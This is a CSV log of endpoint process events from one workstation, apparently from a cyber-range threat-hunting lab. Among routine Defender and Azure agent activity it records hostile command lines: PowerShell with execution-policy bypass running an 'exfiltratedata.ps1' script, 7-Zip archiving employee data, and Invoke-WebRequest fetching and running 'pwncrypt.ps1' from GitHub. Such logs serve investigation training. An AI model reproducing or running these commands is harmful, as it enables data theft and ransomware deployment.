Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,DeviceName
"Apr 1, 2025 6:59:19 PM",cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1",powershell.exe,powershell.exe,sjr-workstation
"Apr 1, 2025 6:59:19 PM",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1",sjr-workstation
"Apr 1, 2025 6:59:23 PM",SearchProtocolHost.exe,"""SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",searchindexer.exe,SearchIndexer.exe /Embedding,sjr-workstation
"Apr 1, 2025 6:59:29 PM",7z.exe,"""7z.exe"" a C:\ProgramData\employee-data-20250401225920.zip C:\ProgramData\employee-data-temp20250401225920.csv",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,sjr-workstation
"Apr 1, 2025 7:09:59 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\cb7aec68-dfca-4632-88ad-5b019cb0957d.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\cb7aec68-dfca-4632-88ad-5b019cb0957d.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'd7bed83c4d48432cf1f3fd5ac190705a5e1fef8a4b4a26aae306832232d464bc')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\cb7aec68-dfca-4632-88ad-5b019cb0957d.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3764"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk1Nn0=""",sjr-workstation
"Apr 1, 2025 7:21:20 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\efc69106-6fc1-423a-94ef-221e65a28f09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\efc69106-6fc1-423a-94ef-221e65a28f09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'fd5bfe65c59a5f51444866e05d9d6f6baafc277c06da2b8d41b69cfe209a2c8b')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\efc69106-6fc1-423a-94ef-221e65a28f09.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3764"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk1Nn0=""",sjr-workstation
"Apr 1, 2025 7:41:51 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\a391f42c-7e1a-4611-8494-1817d2420e09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'd9574233dd6cea38987c40a91c752bfaa879a0b515ce43893a0b6f43abd69823')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3764"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk1Nn0=""",sjr-workstation
"Apr 1, 2025 7:46:31 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'ec94e9ae4ebfebf78db301a2c7e7d522738b6268e2d3d19cffefa9c7f5bff870')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3764"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk1Nn0=""",sjr-workstation
"Apr 1, 2025 7:48:41 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '572b2a22301851acc887be0bcd1575208a4233303fc9abbf5c0c0ee9e18b5347')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3764"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk1Nn0=""",sjr-workstation
"Apr 1, 2025 7:53:52 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'ba3011ad03118a8290495ed858847bb668deb161d72256d36dc18ab0b5f7460a')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3764"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mjk1Nn0=""",sjr-workstation
"Apr 1, 2025 7:59:44 PM",powershell.exe,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml",gc_worker.exe,gc_worker.exe -a WindowsDefenderExploitGuard -c Pending -s inguest -g https://eastus2-gas.guestconfiguration.azure.com/virtualMachines/eb27f8c1-9211-4384-9abe-12b323d68e07,sjr-workstation
"Apr 1, 2025 7:59:58 PM",powershell.exe,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml",gc_worker.exe,gc_worker.exe -a WindowsDefenderExploitGuard -c Pending -s inguest -g https://eastus2-gas.guestconfiguration.azure.com/virtualMachines/eb27f8c1-9211-4384-9abe-12b323d68e07,sjr-workstation
"Apr 1, 2025 8:02:58 PM",powershell.exe,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,cmd.exe,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""",sjr-workstation
"Apr 1, 2025 8:13:31 PM",powershell.exe,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,cmd.exe,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""",sjr-workstation
"Apr 1, 2025 8:13:35 PM",cmd.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script0.ps1",runcommandextension.exe,"RunCommandExtension.exe  ""enable""",sjr-workstation
"Apr 1, 2025 8:13:35 PM",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script0.ps1,cmd.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script0.ps1",sjr-workstation
"Apr 1, 2025 8:13:35 PM",cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script0.ps1,sjr-workstation
"Apr 1, 2025 8:13:35 PM",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1",sjr-workstation
"Apr 1, 2025 8:13:39 PM",cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script0.ps1,sjr-workstation
"Apr 1, 2025 8:13:39 PM",powershell.exe,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1",sjr-workstation
"Apr 1, 2025 8:13:40 PM",SearchProtocolHost.exe,"""SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe9_ Global\UsGthrCtrlFltPipeMssGthrPipe9 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",searchindexer.exe,SearchIndexer.exe /Embedding,sjr-workstation
"Apr 1, 2025 8:24:36 PM",powershell.exe,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\36dc1ba5-2d7a-4cc0-8b07-8b26d1899492.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\36dc1ba5-2d7a-4cc0-8b07-8b26d1899492.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'a2bdbc64446ab9fb7acb4def4cdfa67ba37410dce6199c9ee8ba914445999119')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8795.12576079.0.12576079.12576079-acc777306b8c1be3ac1491bd6b6f712cbdc6a21f\36dc1ba5-2d7a-4cc0-8b07-8b26d1899492.ps1' }""",senseir.exe,"""SenseIR.exe"" ""OfflineSenseIR"" ""3388"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzIwOH0=""",sjr-workstation
"Apr 1, 2025 8:25:04 PM",cmd.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script1.ps1",runcommandextension.exe,"RunCommandExtension.exe  ""enable""",sjr-workstation
"Apr 1, 2025 8:25:04 PM",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script1.ps1,cmd.exe,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script1.ps1",sjr-workstation
"Apr 1, 2025 8:25:05 PM",cmd.exe,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1",powershell.exe,powershell  -ExecutionPolicy Unrestricted -File script1.ps1,sjr-workstation
